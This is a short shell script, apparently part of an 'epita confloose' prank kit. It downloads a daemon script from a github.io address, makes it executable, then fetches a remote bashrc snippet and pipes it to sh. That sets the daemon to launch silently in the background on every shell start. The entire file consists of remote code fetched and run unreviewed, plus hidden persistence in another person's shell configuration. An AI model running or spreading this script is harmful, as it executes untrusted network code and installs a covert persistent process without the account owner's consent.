#!/bin/sh

tempdir=$(mktemp -d)
file="$tempdir/confloose-i3loop"

curl "https://d-002.github.io/epita/confloose/i3loop/daemon.sh" >> "$file"
chmod +x "$file"

echo $(curl "https://d-002.github.io/epita/confloose/bashrc_confloose_base.sh") "i3loop" "'$file 2>/dev/null 1>&2 &'" | sh
